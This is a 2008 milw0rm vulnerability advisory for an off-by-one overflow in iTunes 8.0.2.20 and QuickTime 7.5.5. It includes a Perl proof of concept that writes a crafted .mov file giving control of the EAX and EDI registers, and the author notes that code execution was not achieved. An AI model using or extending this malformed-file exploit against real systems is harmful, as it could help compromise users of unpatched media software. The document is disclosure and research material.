---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Quicktime/Itunes Multiple Remote Off By One Overflow

Application: Itunes 8.0.2.20/Quicktime 7.5.5 (249.26)(-> version 990.7)

Web Site: www.apple.com/

Platform: Windows *, OS X *

Bug: Off by one overflow

Tested agains: Itunes 8.0.2.20/Quicktime 7.5.5 on XP SP3 fully patched

-------------------------------------------------------

1) Introduction

2) Bug

3) Proof of concept

4) Credits

================

1) Introduction

================

"Many of today's leading authoring, multimedia and entertainment applications rely on QuickTime to do the heavy lifting.
QuickTime contains a rich set of developer APIs for handling almost any audio, video and media task.
Easily make your application multimedia-enabled with QuickTime."

=======

2) Bug

=======
Quicktime & itunes fails to handle long arguments on a .mov file.
Quicktime is compiled with the /GS cookie on , so the bug get handled with an exit code :
c0000409
but ...
Itunes doesn't seems to be compiled with the /GS flag, so we get some code execution possible via Itunes.
The PoC give's us full control over EAX & EDI
Itunes call unsafely the Quicktime function to play the .mov, so we can trigger a possible code execution
via this unsafe call to quicktime hÃ©hÃ©hÃ© :)
The only problem, is the lengh of the buffer overflowed :(
erf ... 49 bytes, less the 8 bytes controlling the EDI & EAX registers so 41.
i've tryed to find a way to fill some buffer in the .mov to get some code exec working on this poc,
but out of luck, i guess someone will maybe be able to do some magic tricks :)


==================

3)Proof of concept

==================

#!/usr/bin/perl

use strict;

my $movfile =
"\x00\x00\x00\x7d\x6d\x6f\x6f\x76\x00\x00\x00\x75\x72\x6d\x72\x61\x00\x00\x00\x6d".
"\x72\x6d\x64\x61\x00\x00\x00\x55\x72\x64\x72\x66\x00\x00\x00\x00\x75\x72\x6c\x20".
"\x00\x00\x00\x41\x68\x74\x74\x70\x3a\x2f\x2f\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31".
"\x2f\x74\x65\x73\x74\x2e\x6d\x6f\x76\x00\x00\x00\x00\x10\x72\x6d\x64\x72\x00\x00".
"\x00\x00\x00\x00\x05\x78".
"\x41\x42\x43\x44". #EDI here
"\x61\x62\x63\x64". #EAX here
"\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x44\x44\x44\x44\x41\x41\x43\x43".
"\x43\x41\x41\x41\x42\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";


open(out, "> test.mov");
binmode(out);
print (out $movfile);
close(out);

//if you build this same payload , with a couple of bytes before theses null bytes you will trigger the same bug but in a different way ...
=====

5)Credits

=====

laurent gaffiÃ©

laurent.gaffie{remove_this}[at]gmail[dot]com

# milw0rm.com [2008-11-30]